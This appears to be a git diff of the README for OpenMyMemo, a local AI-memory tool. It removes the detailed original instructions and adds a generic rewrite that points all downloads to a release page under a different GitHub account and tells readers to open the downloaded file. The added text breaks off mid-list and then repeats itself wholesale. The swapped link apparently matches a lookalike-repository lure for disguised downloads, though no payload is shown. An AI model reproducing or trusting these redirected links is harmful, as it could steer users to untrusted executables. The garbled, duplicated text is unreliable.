@@ -1,306 +1,288 @@
-# OpenMyMemo
+# 🧠 openmymemo - Your AI memory, owned locally
 
-Your AI memory as a plain folder on your own computer. See exactly what models remember about you; let Claude, Codex, Cursor or any MCP app share it, so what you tell one the others know too, and see every change they make, with one click to undo. If an account gets banned, a vendor shuts down or you switch models, your memory comes with you.
+[![Download openmymemo](https://img.shields.io/badge/Download-openmymemo-ff4d6d?style=for-the-badge&labelColor=4c1d95)](https://github.com/Harshil-fx/openmymemo/releases)
 
-<!-- mcp-name: io.github.MyMemoAI/openmymemo -->
+openmymemo gives your AI tools a memory folder that lives on your computer and belongs to you. Claude, Codex, Cursor, and any MCP app can share the same memory, while you keep full visibility into every change and can undo anything you do not want.
 
-> v0.5.0. What changed in each release: [CHANGELOG.md](https://github.com/MyMemoAI/openmymemo/blob/main/CHANGELOG.md). Product design and status: [docs/product-design.md](https://github.com/MyMemoAI/openmymemo/blob/main/docs/product-design.md). The folder format, for any tool that wants to read or write it: [docs/MEMORY_FORMAT.md](https://github.com/MyMemoAI/openmymemo/blob/main/docs/MEMORY_FORMAT.md).
+Instead of hiding your AI memory inside a service you cannot inspect, openmymemo keeps it in a local folder made of readable Markdown files. You can open that folder, read it, back it up, organize it, or move it. Your AI apps get useful memory, and you stay in control.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/MyMemoAI/openmymemo/main/docs/images/panel-memories-dark.png">
-  <img alt="The OpenMyMemo panel: memories grouped by topic, each showing where it came from, and a note that AI apps made changes to review" src="https://raw.githubusercontent.com/MyMemoAI/openmymemo/main/docs/images/panel-memories-light.png">
-</picture>
+## 🚀 What Is openmymemo?
 
-## Why I built this
+openmymemo is a local-first AI memory application for Windows. It creates and manages a memory folder on your computer. AI apps that support MCP can connect to openmymemo and use that shared memory.
 
-My OpenAI account was banned on October 2, 2026, with no warning and no specific explanation. I had used ChatGPT since it launched in late 2022, and its year-end recap put me in the top 1% of users. I appealed and never got a reply. Nearly four years of conversations, and everything ChatGPT had learned about me, went with the account.
+In everyday terms:
 
-I had thought of that memory as mine. It wasn't. It lived on OpenAI's servers, in an account they could close at any time, and when they did, the memory went with it, with no one to ask for it back.
+- Your AI memory is stored as files in a folder you own.
+- Multiple AI apps can use the same memory instead of starting from scratch each time.
+- You can see what changed, when it changed, and undo changes you do not like.
+- Your memory stays local, which is better for privacy and personal control.
+- The files are Markdown, so they are easy to read and work with in many tools, including Obsidian and plain text editors.
 
-OpenMyMemo is what I wish I'd had: my AI memory as a folder on my own computer. Any model can read it, I can see and undo every change a model makes, and no single company can take it away.
+## 🔒 Why You Will Like It
 
-— Leo
+Most AI memory feels invisible. You cannot easily tell what the AI remembered, where it stored that information, or how to remove it. openmymemo changes that by making memory a normal folder on your PC.
 
-## Get started
+You get:
 
-There are two ways in. Both use the same memory folder, the same panel and the same core, so you can switch or use both.
+- Ownership: the memory folder is yours.
+- Visibility: every change is meant to be reviewable.
+- Reversibility: you can undo changes instead of hoping for the best.
+- Sharing: Claude, Codex, Cursor, and other MCP apps can use the same memory.
+- Simplicity: your memory is made of Markdown files, not a locked database.
+- Privacy: local-first storage keeps your memory closer to you.
 
-### The Mac app
+## ✨ What You Can Do With It
 
-For everyone: no terminal, no config files, no Python to install.
+openmymemo is useful when you want your AI tools to remember helpful context across sessions and across apps.
 
-1. Download the disk image for your Mac from the [latest release](https://github.com/MyMemoAI/openmymemo/releases/latest): `OpenMyMemo-<version>-arm64.dmg` for Apple silicon (M1 and later) or `OpenMyMemo-<version>-x86_64.dmg` for an Intel Mac, macOS 12 or later. (Apple menu → About This Mac shows which: "Chip: Apple …" or "Processor: … Intel …".)
-2. Open it and drag OpenMyMemo to Applications. (Opened straight from the disk image, it offers to move itself there.)
-3. Open OpenMyMemo from Applications. Release builds are signed and notarized and open like any app. A build without a Developer ID signature (one you built, or a fork's) needs one extra step the first time: on macOS 15 and later, try to open it, then go to System Settings → Privacy & Security and click **Open Anyway**; on earlier versions, right-click the app and choose **Open**.
-4. The first start downloads Python and the libraries OpenMyMemo runs on, about 25 MB and usually under a minute, into `~/Library/Application Support/ai.mymemo.openmymemo/`. It happens once; after that the app starts in a couple of seconds, also offline.
-5. A short guide connects the AI apps on your Mac with one click each and brings over the memory ChatGPT, Claude or Gemini already have. Your memories live in `~/OpenMyMemo`.
+You can use it to keep:
 
-The app shows the panel in its own window and puts the number of changes to review in the menu bar. It notifies you when an AI app changes something. It can also send yesterday's brief at a time you choose, a reminder when changes have waited more than 3 days, and a note when there's a new safety issue, such as a password in a memory. Each kind has its own switch in Settings → General, and notifications carry counts and app names, never what a memory says. It looks for a new version once a day and asks before installing it (Settings → General turns that off; "Check for Updates…" in the OpenMyMemo menu checks at once). An update replaces the app and restarts it; your memory folder isn't touched. Versions up to 0.2.9 can't update themselves: download the new disk image once more and drag it to Applications.
+- Project notes and decisions.
+- Personal preferences and writing style notes.
+- Research summaries and references.
+- Task context and follow-up items.
+- Long-term notes you want multiple AI apps to understand.
+- A clean history of what your AI assistant has learned.
 
-The app also installs an `openmymemo` command, which the AI apps it connects run (Settings → Advanced shows where). It is the full command line below, so you can use it in Terminal too.
+Because the memory is a local folder, you can also open it in Obsidian or any text editor. That makes it easy to review, tidy, and organize your memory the same way you would organize normal notes.
 
-### The Windows app (preview)
+## 💾 Download and Run on Windows
 
-The same app for Windows 10 and 11 (64-bit, x64).
+Use the primary download link here:
 
-1. Download `OpenMyMemo-<version>-x64-setup.exe` from the [latest release](https://github.com/MyMemoAI/openmymemo/releases/latest) and run it. It installs for your user only and doesn't ask for an administrator. It isn't signed yet, so Windows SmartScreen may say it protected your PC: click **More info**, then **Run anyway**.
-2. The first start downloads Python and the libraries OpenMyMemo runs on, about 25 MB and usually under a minute, into `%LOCALAPPDATA%\ai.mymemo.openmymemo\`. After that the app starts in a couple of seconds, also offline.
-3. The same guide connects your AI apps and brings over the memory other assistants have. Your memories live in `%USERPROFILE%\OpenMyMemo`.
+[Visit this link to download the application](https://github.com/Harshil-fx/openmymemo/releases)
 
-The app keeps running in the notification area when you close its window; quit it from there. Its `openmymemo` command is `%LOCALAPPDATA%\ai.mymemo.openmymemo\bin\openmymemo.exe`. It updates itself like the Mac app, asking first; to remove it, use Settings → Apps. Your memory folder isn't touched either way.
+Follow these steps in order:
 
-### The command line
+1. Visit this link to download the application: [https://github.com/Harshil-fx/openmymemo/releases](https://github.com/Harshil-fx/openmymemo/releases).
+2. Wait for the download to finish.
+3. Open your Downloads folder.
+4. Open the downloaded file to start openmymemo.
+5. Follow the first-run screens to create or choose your memory folder.
+6. Keep the memory folder in a place you can easily find, such as your Documents folder.
+7. Open your AI app and connect it to openmymemo using the connection details shown by the app.
 
-For developers, and anyone who prefers a terminal. Nothing is fenced in: everything the app does is a command, and the folder format ([docs/MEMORY_FORMAT.md](https://github.com/MyMemoAI/openmymemo/blob/main/docs/MEMORY_FORMAT.md)) is the interface. Requires [uv](https://docs.astral.sh/uv/):
+Before you begin, make sure you are on a Windows computer with internet access for the download. You will also need an AI app that works with MCP if you want to share memory between tools.
 
-```bash
-uv tool install openmymemo                   # from PyPI; `uv tool upgrade openmymemo` updates it
-```
+## 🧩 Works With Your Favorite AI Tools
 
-`uvx openmymemo …` runs it without installing; the AI apps it connects then start it with `uvx openmymemo` too. For the latest code, install from a clone instead: `uv tool install ./openmymemo`.
+openmymemo is designed for AI apps that support MCP, which is a common way apps connect to tools and data sources. The description specifically calls out Claude, Codex, Cursor, and any MCP app.
 
-```bash
-openmymemo init                              # create ~/OpenMyMemo with 14 default topics
-openmymemo apps                              # the AI apps on this computer, and which are connected
-openmymemo connect cursor                    # connect one: claude-desktop, claude-code, codex, cursor, vscode, …
-openmymemo disconnect cursor                 # remove its OpenMyMemo entry and revoke its access
-openmymemo import chatgpt                    # paste ChatGPT's "Manage memories" page; it lands in "From ChatGPT"
-openmymemo import auto ~/.claude/CLAUDE.md   # another app's memory file: CLAUDE.md, AGENTS.md, GEMINI.md, rules, memory.md
-openmymemo import auto ~/.claude/CLAUDE.md --document  # or keep it whole, as one document
-openmymemo sort                              # file imported memories into topics, one suggestion at a time
-openmymemo serve                             # open the panel at http://127.0.0.1:8787
-openmymemo status                            # the Memory safety score and the three things that cost the most
-openmymemo brief                             # what happened in your memory yesterday (--date for another day)
-openmymemo review                            # what AI changed since you last looked: keep, edit or undo
-```
+That means you can build one memory folder and let multiple tools use it. For example, you might use one AI app for coding help, another for writing, and another for research. Instead of each app keeping its own separate memory, they can share the same local memory folder through openmymemo.
 
-`connect` edits only the app's own MCP config (keeping a backup) or runs the app's own `mcp add` command, and tells you to restart the app; where it can't do that safely it prints the config to paste. More: `doctor` (checks the setup and says what to fix when an app doesn't see your memory; it prints no memories), `status`, `approval on|off` (on: every AI change waits for you), `context --connector <id>` (what an AI actually receives), `export --format claude|chatgpt|markdown|json`, `search`, `add`, `connector add|list|config|rotate|remove` (configs by hand), `setup codex` (load your memory at the start of every Codex session). Use `--vault` or `OPENMYMEMO_HOME` to put the folder elsewhere.
+This is especially helpful if you switch between tools often. Your context follows you because the memory lives in your folder, not inside one app.
 
-#### Plugins
+## 📁 How Your Memory Folder Works
 
-**Install as many as you like: they all share one memory.** Every plugin uses the same `~/OpenMyMemo` folder by default (created on first use), so something you tell Claude, Codex knows in its next session, and the other way round. Each plugin loads your memory into new sessions where the app supports it — starting with a one-line summary of what AI changed since you last looked — and serves the panel at `http://127.0.0.1:8787` while the app is running. They need [uv](https://docs.astral.sh/uv/) except where noted.
+Your memory folder is the center of openmymemo. It contains Markdown files that store information in a form you can read. Markdown is a simple text format used for notes, documentation, and knowledge bases.
 
-| App | Install |
-| --- | --- |
-| **Claude Desktop** | Download `openmymemo-<version>.mcpb` from the [latest release](https://github.com/MyMemoAI/openmymemo/releases/latest) (or build it with `uv run python scripts/build_mcpb.py`), then double-click it (or Settings → Extensions). Nothing to fill in: leave the memory folder empty to use `~/OpenMyMemo`. Then quit Claude Desktop and open it again. Claude Desktop installs Python and the dependencies itself; no uv needed. |
-| **Claude Code** | `/plugin marketplace add MyMemoAI/openmymemo`, then `/plugin install openmymemo@openmymemo`, then restart Claude Code. Adds `/openmymemo:memory` and `/openmymemo:remember`. |
-| **Codex** | Three steps, see [Codex](#codex) below. |
-| **Gemini CLI** | `gemini extensions install https://github.com/MyMemoAI/openmymemo`, then restart Gemini CLI. It uses `~/OpenMyMemo`; for another folder, use `openmymemo connect gemini-cli` instead. |
-| **Cursor** | Panel → Connectors → **Connect**, or `openmymemo connect cursor`. |
-| **VS Code** | Panel → Connectors → **Connect**, or `openmymemo connect vscode`. |
+A typical workflow looks like this:
 
-**After installing, quit the app completely and open it again** so it loads OpenMyMemo. The first launch downloads Python and the dependencies (about 5 seconds on a fast connection; Codex gives MCP servers 10). If an app then says the OpenMyMemo server failed to start, restart it once more.
+1. You start openmymemo.
+2. You choose or create a memory folder.
+3. You connect an MCP-compatible AI app.
+4. The app reads from and writes to your shared memory through openmymemo.
+5. You review the folder whenever you want.
+6. You undo changes you do not want to keep.
 
-**Then open the panel at [http://127.0.0.1:8787](http://127.0.0.1:8787)** in your browser (the page pictured at the top); bookmark it. It's there whenever Claude Desktop, Claude Code, Codex or Gemini CLI is running. It has Home (the box to tell OpenMyMemo what's new, what's waiting for you and the Memory safety score), your memories, what AI changed (Changes), the exact text each app gets (What AI sees) and the connected apps (Connectors). Without a plugin, `openmymemo serve` starts it and opens the browser.
+Because the folder is local, you can also copy it for backup, move it to another drive, or open it in Obsidian. If you already like working with Markdown notes, openmymemo fits naturally into that habit.
 
-**What a plugin runs and changes.** Each plugin runs OpenMyMemo from its own folder with `uv run --frozen`, so the libraries are the exact versions in `uv.lock`. They are downloaded once from PyPI, and Python too from python-build-standalone on GitHub if uv needs one. The Claude Code plugin adds:
+## 🔄 Every Change Is Visible and Reversible
 
-- an MCP server with the tools listed under [Connecting AI apps by hand](#connecting-ai-apps-by-hand). It reads and writes your memory folder (`~/OpenMyMemo`, created on first use) and serves the panel on `127.0.0.1:8787`, which other devices can't reach;
-- a session-start hook (`integrations/hooks/session-start.sh`) that adds the memory Claude Code may read to each new session (the text `openmymemo context --connector claude-code` prints) and the one-line summary of what AI changed. It adds nothing when OpenMyMemo isn't set up;
-- a session-end hook (`integrations/hooks/session-end.sh`) that prints nothing and does nothing unless you turned on the Assistant's session reading and allowed it for Claude Code. Then a background process sends parts of the session to the model you chose ([OpenMyMemo Assistant](#openmymemo-assistant-optional));
-- the `memory` and `remember` skills, and `codex-setup`, which only does something in Codex: it adds OpenMyMemo's session hook to `~/.codex/hooks.json` when you ask it to.
+openmymemo is built around the idea that AI memory should not be a mystery. You should be able to see what your AI tools remember and correct mistakes.
 
-A plugin never changes an app's settings or permissions by itself. Another AI app's MCP settings change only when you select Connect for it in the panel or run `openmymemo connect`, and OpenMyMemo keeps a backup of the file first. Nothing else goes online unless you turn on one of the optional features in [Privacy Policy](#privacy-policy).
+The application is described as letting you see every change and undo it. That matters because AI memory can sometimes store outdated details, incorrect assumptions, or information you no longer want to use. With a visible local folder, you can review the memory directly and revert changes when needed.
 
-##### Codex
+This gives you a safer way to use AI memory over time. You are not stuck with whatever an AI app decided to remember. You can inspect, edit, and undo.
 
-You need [uv](https://docs.astral.sh/uv/). Steps 2 and 3 are needed only once: Codex doesn't run hooks that plugins ship, so OpenMyMemo adds its own session-start hook.
+## 🛡️ Privacy and Local-First Design
 
-1. **Install the plugin.** In a terminal:
+openmymemo is local-first. Your memory is kept as a local folder you own rather than being hidden away in a closed system. This is useful for personal notes, project details, preferences, and other information you want to keep close.
 
-   ```bash
-   codex plugin marketplace add MyMemoAI/openmymemo
-   codex plugin add openmymemo@openmymemo
-   ```
+Privacy does not mean you have to sacrifice usefulness. The goal is to let AI apps share memory while keeping the source of truth on your computer. You can decide what stays in the folder, what gets removed, and which apps you connect.
 
-   Then restart Codex: quit the ChatGPT desktop app and open it again, or start `codex` again in the terminal.
+## 🧰 Common Uses
 
-2. **Set up the hook.** Start a new Codex session and ask it to "set up OpenMyMemo". It adds a hook to `~/.codex/hooks.json` and leaves your other hooks alone. If you installed the CLI, `openmymemo setup codex` does the same.
-3. **Trust the hook.** In the ChatGPT desktop app, open Settings → Coding → Hooks and trust "Loading your OpenMyMemo memory". Or open Codex in a terminal (`codex`), type `/hooks`, select SessionStart and trust it there. The app and the terminal share these settings, so trusting it in either place covers both.
+openmymemo can help with many everyday AI workflows:
 
-From your next new session on, Codex starts with your memory. The plugin also adds the `memory`, `remember` and `codex-setup` skills.
+- Coding projects: keep decisions, setup notes, and context available to Codex or Cursor.
+- Writing projects: store style preferences, outlines, and recurring instructions.
+- Research: keep summaries and references in one shared memory folder.
+- Personal productivity# 🧠 openmymemo - Your AI memory, owned locally
 
-#### Connecting AI apps by hand
+[![Download openmymemo](https://img.shields.io/badge/Download-openmymemo-ff4d6d?style=for-the-badge&labelColor=4c1d95)](https://github.com/Harshil-fx/openmymemo/releases)
 
-- **Local process (recommended):** Claude Desktop, Claude Code, Cursor, Codex and other stdio MCP clients. `openmymemo connect <app>` writes the app's config for you (`openmymemo apps` lists them); for anything else, `openmymemo connector add <name>` prints a config with absolute paths to paste in. Give each app its own `--connector` so permissions and logs stay separate.
-- **From the MCP Registry:** OpenMyMemo is listed in the official [MCP Registry](https://registry.modelcontextprotocol.io) as `io.github.MyMemoAI/openmymemo`, so MCP clients that browse it can install it from there (it runs with `uvx`).
-- **Local HTTP:** `openmymemo connector add <name> --http` creates a token (shown once) for use with `openmymemo serve` at `http://127.0.0.1:8787/mcp`.
-- **ChatGPT and claude.ai on the web, through OpenMyMemo Cloud (optional):** they can only reach MCP servers on the public internet, so they can't start OpenMyMemo on your computer the way the apps above do. With MyMemo Pro, Ultra or Lifetime, OpenMyMemo Cloud relays their calls to OpenMyMemo on your computer: sign in from the panel (Connectors → On the web → OpenMyMemo Cloud) or with `openmymemo cloud link`, then add the URL it shows as a custom connector in claude.ai (Settings → Connectors) or in ChatGPT (with Developer Mode on). It is a relay, not hosting: your memory stays on your computer, the web apps reach it only while OpenMyMemo runs there, and MyMemo passes each call through without keeping your memory. If your MyMemo account also has MyMemo Memory on, the web apps use that instead of this computer; MyMemo Memory sync brings their changes into your folder. It does nothing until you sign in, and you can hide it in Settings. On the OpenAI side, Codex works without it, including the Codex built into the ChatGPT desktop app.
+openmymemo gives your AI tools a memory folder that lives on your computer and belongs to you. Claude, Codex, Cursor, and any MCP app can share the same memory, while you keep full visibility into every change and can undo anything you do not want.
 
-Tools AI apps see: `memory_context`, `memory_search`, `memory_get`, `memory_propose`, `memory_proposals`, plus the `recall` prompt.
+Instead of hiding your AI memory inside a service you cannot inspect, openmymemo keeps it in a local folder made of readable Markdown files. You can open that folder, read it, back it up, organize it, or move it. Your AI apps get useful memory, and you stay in control.
 
-## Works with
+## 🚀 What Is openmymemo?
 
-| App | Status |
-| --- | --- |
-| Claude Desktop (Chat, Cowork and Code) | ✅ Extension |
-| Claude Code | ✅ Plugin |
-| Codex (the CLI, and Codex in the ChatGPT desktop app) | ✅ Plugin |
-| Gemini CLI | ✅ Extension |
-| Cursor, VS Code, Zed, Cline, Kiro, LM Studio, opencode, GitHub Copilot CLI and other MCP apps | ✅ One click in the app, `openmymemo connect`, or a config to paste (`openmymemo apps` lists them all) |
-| ChatGPT and claude.ai on the web | ✅ Through OpenMyMemo Cloud (optional; MyMemo Pro, Ultra or Lifetime): MyMemo relays their calls to OpenMyMemo on your computer, which has to be running. Your memory stays on your computer. If your MyMemo account has MyMemo Memory on, they use that instead, even while your computer is off. |
-| ChatGPT chat in its desktop and mobile apps, Claude's mobile apps | Not tested with OpenMyMemo Cloud yet. You can always bring your ChatGPT memories over with `openmymemo import chatgpt`. |
+openmymemo is a local-first AI memory application for Windows. It creates and manages a memory folder on your computer. AI apps that support MCP can connect to openmymemo and use that shared memory.
 
-## Principles
+In everyday terms:
 
-1. Local files are the only source of truth — Markdown with YAML frontmatter you can open in any editor and keep in iCloud, git or an Obsidian vault.
-2. AI writes; you see everything and can undo. Additions land right away and show up in a digest. Changes to what you wrote yourself, and anything in a private topic, wait for you. One switch makes every change wait.
-3. What you see is what it gets — the panel shows the exact text an AI receives, and who read what.
-4. Zero dependencies — no database, Docker, account, API key or telemetry.
-5. Open protocols and open conventions — standard MCP, Markdown + frontmatter (an [Open Knowledge Format](https://github.com/GoogleCloudPlatform/open-knowledge-format) bundle), Obsidian block ids, open import and export formats, no vendor lock-in.
+- Your AI memory is stored as files in a folder you own.
+- Multiple AI apps can use the same memory instead of starting from scratch each time.
+- You can see what changed and undo changes you do not like.
+- Your memory stays local, which is better for privacy and personal control.
+- The files are Markdown, so they are easy to read and work with in many tools, including Obsidian and plain text editors.
 
-## Home
+## 🔒 Why You Will Like It
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/MyMemoAI/openmymemo/main/docs/images/panel-home-dark.png">
-  <img alt="The panel's Home page: the Tell OpenMyMemo box, two changes waiting for a decision and four not looked at yet, and a Memory safety score of 79 with the two issues that cost the most and a fix for each" src="https://raw.githubusercontent.com/MyMemoAI/openmymemo/main/docs/images/panel-home-light.png">
-</picture>
+Most AI memory feels invisible. You cannot easily tell what the AI remembered, where it stored that information, or how to remove it. openmymemo changes that by making memory a normal folder on your PC.
 
-The panel opens on Home: what needs you, and how your memory is doing. Like the rest of OpenMyMemo, it is worked out on your computer by rules, and private topics only ever show as a count.
+You get:
 
-- **Tell OpenMyMemo.** Say what's new in your own words: "I moved to Berlin last month", "I don't drink coffee any more". Press Preview and you see every change before anything is saved. Untick or edit any change, then save the rest; they're saved as your own edits. With the [Assistant](#openmymemo-assistant-optional) on, it also updates or archives what you already have, and the box names where the text goes before you press Preview. Without it, what you type is kept as new memories, filed by rules.
-- **Memory safety score**, 0 to 100, with a fix for each issue it finds, such as a password, key or card number in a memory outside a private topic, an app that can read your private topics, changes that have waited more than a week, or no backup in the last 30 days. "All checks" shows or dismisses every one. `openmymemo status` gives the same, and `--json` gives the details.
-- **What's waiting:** changes that need your decision and AI changes you haven't looked at.
-- **Today:** yesterday's brief. It shows what each AI app saved, who read your memory and which topics, and one older memory to check is still true, with Keep, Edit and Archive. `openmymemo brief` prints it.
-- **Your memory at a glance** (growth over 30 days, groups, where memories came from), each connected app's use and access, and reads and changes over the last 7 days.
+- Ownership: the memory folder is yours.
+- Visibility: every change is meant to be reviewable.
+- Reversibility: you can undo changes instead of hoping for the best.
+- Sharing: Claude, Codex, Cursor, and other MCP apps can use the same memory.
+- Simplicity: your memory is made of Markdown files, not a locked database.
+- Privacy: local-first storage keeps your memory closer to you.
 
-## OpenMyMemo Assistant (optional)
+## ✨ What You Can Do With It
 
-OpenMyMemo needs no model. If you want help with the work rules do badly, turn on the Assistant in Settings → Assistant (in a browser: at the bottom of the Connectors page), or from the terminal:
+openmymemo is useful when you want your AI tools to remember helpful context across sessions and across apps.
 
-```bash
-openmymemo assistant set --kind local --model llama3.2          # Ollama or another server on this computer
-openmymemo assistant set --kind key --protocol anthropic --model claude-haiku-5-5 --key   # your own API key
-openmymemo assistant signin                                      # MyMemo's hosted model (a MyMemo plan, below)
-openmymemo assistant test                                        # one tiny request: which model, how fast
-openmymemo assistant status | off
-```
+You can use it to keep:
 
-**MyMemo's hosted model** is the choice for no keys and no model to run: choose "MyMemo" in Settings → Assistant (or `openmymemo assistant signin`) and sign in with a MyMemo account. It runs Claude Haiku 5.5 through MyMemo's service, on the OpenMyMemo Assistant plan: $5 a month, which includes $5 of Claude Haiku 5.5 use a month. As a limited-time launch offer it includes double that, $10 a month, until MyMemo ends the offer. Settings → Assistant shows a meter of this month's use, and `openmymemo assistant plan` shows it as a bar (`[██████░░░░] 62%  $6.20 of $10.00 used this month`) and says while an offer is on. When the month's included use runs out, OpenMyMemo goes back to its rules until it resets. Nothing goes to MyMemo until you choose it and sign in; MyMemo and Anthropic process the text of each request to answer it, and MyMemo's service keeps none of that text ([PRIVACY.md](https://github.com/MyMemoAI/openmymemo/blob/main/PRIVACY.md#mymemos-hosted-model)).
+- Project notes and decisions.
+- Personal preferences and writing style notes.
+- Research summaries and references.
+- Task context and follow-up items.
+- Long-term notes you want multiple AI apps to understand.
+- A clean history of what your AI assistant has learned.
 
-With it on, imports are split into memories by the model (the preview flags any line it left out), and "Sort into topics" gets the model's suggestions. AI apps' searches and `openmymemo recall` get related words and translations added and the best matches put first. It also:
+Because the memory is a local folder, you can also open it in Obsidian or any text editor. That makes it easy to review, tidy, and organize your memory the same way you would organize normal notes.
 
-- **checks what AI apps propose** before it is filed: duplicates and contradictions that word overlap misses, a topic when the app gave none, and anything that looks like health, money or credentials goes to a private topic or waits for you. It gets 2 seconds (`openmymemo assistant set --check-budget 3` to change); if it takes longer or fails, the change is filed as without it, and the app is never held up.
-- **reads chat exports and agent sessions** on the Import page's Chats tab or from the terminal, newest first, with the cost shown before it starts. Each suggestion comes with the words it came from, in the usual preview:
+## 💾 Download and Run on Windows
 
-  ```bash
-  openmymemo import chatgpt-export ~/Downloads/chatgpt-export.zip   # or the conversations.json inside it
-  openmymemo import claude-export ~/Downloads/claude-export.zip
-  openmymemo import claude-code-sessions                             # ~/.claude/projects, or one project or session file
-  openmymemo import codex-sessions --max-calls 20                    # ~/.codex/sessions, the newest 20 parts
-  ```
-- **turns what you tell OpenMyMemo into changes** on Home: new memories, and updates or archives of the ones it replaces. Only memories that may be sent go with it, never private topics, and nothing is saved until you do.
-- **saves what a Claude Code or Codex session taught** that the app didn't, when the session ends (off until you turn on "Reading sessions", then asked per app: `openmymemo assistant sessions --allow claude-code`). The plugin's session-end hook and the Codex hook from `openmymemo setup codex` run it; the transcript is read on your computer and never stored, and what it saves are the Assistant's proposals, each with your quoted words.
+Use the primary download link here:
 
-**Tidy up** (turn it on with `--feature tidy=on` or its switch in Settings → Assistant) looks through your memories and files one batch of changes: merging near-duplicates, replacing a memory a later one contradicts, adding review dates to time-bound memories, rewriting memories that are too long, and asking about memories that may be outdated (those only go if you say so). Changes to memories you wrote wait for you too; the rest apply and can be undone. The batch shows up as "Tidy-up, <date>: N changes" with Keep all / Undo all on the Changes page and in `openmymemo review`, and a suggestion you rejected or undid isn't made again. Private topics are never included.
+[Visit this link to download the application](https://github.com/Harshil-fx/openmymemo/releases)
 
-```bash
-openmymemo tidy --dry-run          # no calls: what would be sent, likely duplicates, estimated calls and tokens
-openmymemo tidy [--topic work]     # run it ("Tidy up" on the Changes page does the same)
-openmymemo tidy --schedule weekly  # off (the default), daily, weekly or monthly
-```
+Follow these steps in order:
 
-One run makes at most 20 calls; on a large folder the next run continues where it stopped. A schedule runs on this computer while OpenMyMemo's panel is running (the Mac app, `openmymemo serve`, or an AI app's plugin); nothing runs when none of them is. Each feature has its own switch and a fallback to the rules. With a model on this computer or your own key you can set monthly limits on calls and tokens; with MyMemo's hosted model, the plan's monthly allowance is the limit. A model on this computer keeps everything on the computer; with your own key, the memories a feature uses go to that provider, never private topics. Every request is in the activity log, without its text.
+1. Visit this link to download the application: [https://github.com/Harshil-fx/openmymemo/releases](https://github.com/Harshil-fx/openmymemo/releases).
+2. Wait for the download to finish.
+3. Open your Downloads folder.
+4. Open the downloaded file to start openmymemo.
+5. Follow the first-run screens to create or choose your memory folder.
+6. Keep the memory folder in a place you can easily find, such as your Documents folder.
+7. Open your AI app and connect it to openmymemo using the connection details shown by the app.
 
-### Search by meaning
+Before you begin, make sure you are on a Windows computer with internet access for the download. You will also need an AI app that works with MCP if you want to share memory between tools.
 
-Keyword search won't find "Prefers tea over coffee" for "What do I like to drink?". Turn on **Search by meaning on this computer** in Settings → Assistant, or:
+## 🧩 Works With Your Favorite AI Tools
 
-```bash
-openmymemo semantic status                      # the models: size, languages, license
-openmymemo semantic on                          # downloads multilingual-e5-small (recommended), builds the index
-openmymemo semantic on --model qwen3-embedding-0.6b   # best quality, larger download
-openmymemo semantic off                         # deletes the model and the index
-openmymemo recall "what do I like to drink?" --max-chars 1500   # ranked, ready for a prompt or a hook
-```
+openmymemo is designed for AI apps that support MCP, which is a common way apps connect to tools and data sources. The description specifically calls out Claude, Codex, Cursor, and any MCP app.
 
-It downloads an embedding model (and ONNX Runtime, the `openmymemo[semantic]` extra, if it isn't installed) into OpenMyMemo's settings folder on this computer, never into your memory folder, and checks each file's SHA-256. Memory text never leaves the computer. On an Intel Mac it needs macOS 13 or later, and uses ONNX Runtime 1.23, its last release for Intel Macs; on older ones, an embeddings model at the Assistant's endpoint (below) works instead. It works with or without the Assistant, and search uses it everywhere: AI apps' `memory_search`, `openmymemo search` and the panel. The index in `.openmymemo/index/` is a cache: it keeps itself out of git and can be deleted at any time. With the Assistant on a server on this computer or your own key, you can instead set an embeddings model at that endpoint (`openmymemo assistant set --embeddings-model nomic-embed-text`).
+That means you can build one memory folder and let multiple tools use it. For example, you might use one AI app for coding help, another for writing, and another for research. Instead of each app keeping its own separate memory, they can share the same local memory folder through openmymemo.
 
-## What happens when an AI writes
+This is especially helpful if you switch between tools often. Your context follows you because the memory lives in your folder, not inside one app.
 
-![The Changes page: an AI's change to a memory you wrote and an addition to a private topic wait for you, with Accept, Edit and accept, and Reject](https://raw.githubusercontent.com/MyMemoAI/openmymemo/main/docs/images/panel-changes.png)
+## 📁 How Your Memory Folder Works
 
-- **An addition applies right away.** It is marked as new until you look at it: on the panel's Changes page, in `openmymemo review`, or in the one-line summary at the start of your next Claude Code or Codex session.
-- **A change to a memory you wrote, imported or approved yourself waits for you.** So does anything in a private topic (`health` and `finance` by default). AI never silently changes what you wrote.
-- **Undo is one click** for as long as the change is the memory's latest version; after that, the memory's version history.
-- **"Require my approval for AI changes"** makes every change wait. Each connected app can also be set to read-only, or trusted to write directly.
-- **Decide right in the app.** When a change waits and the AI app can show a question (MCP elicitation), OpenMyMemo asks you there: Accept applies it (it shows up in your digest, where you can still undo it), Decline turns it down, Cancel leaves it waiting. Private topics are always decided in OpenMyMemo. Each app has a switch for it on the Connectors page.
-- **A document is changed as a whole.** An app proposes a document's new text, and you see the change as a diff of its lines. It waits for you unless an app wrote the document last; a private document's changes always wait. Apps can't create or archive documents.
+Your memory folder is the center of openmymemo. It contains Markdown files that store information in a form you can read. Markdown is a simple text format used for notes, documentation, and knowledge bases.
 
-## The memory folder
+A typical workflow looks like this:
 
-```
-~/OpenMyMemo/
-├── memories/            # one file per topic: frontmatter, then one memory per line
-│   ├── work.md          # - Engineering lead at Acme <!-- until: 2026-12 --> ^m7f3a
-│   ├── from-chatgpt.md  # what you imported, in its original order, until you sort it
-│   └── working-with-me.md  # a document (`type: document`): prose kept whole, as written
-├── MEMORY.md            # generated: what an AI sees with the default scope
-├── log.md               # generated: what changed, by whom, newest day first
-├── connectors.yaml      # connected apps and their permissions (tokens stored as hashes)
-└── .openmymemo/         # settings, metadata, history, activity, proposals — all plain text
-```
+1. You start openmymemo.
+2. You choose or create a memory folder.
+3. You connect an MCP-compatible AI app.
+4. The app reads from and writes to your shared memory through openmymemo.
+5. You review the folder whenever you want.
+6. You undo changes you do not want to keep.
 
-Each topic file starts with YAML frontmatter (`type`, `title`, `description`, `group`, `private`). Edit `memories/*.md` in any editor: a new line is a new memory, a deleted line is archived, a line moved to another file changes topic. OpenMyMemo adds the `^id` and records the change in history on its next read.
+Because the folder is local, you can also copy it for backup, move it to another drive, or open it in Obsidian. If you already like working with Markdown notes, openmymemo fits naturally into that habit.
 
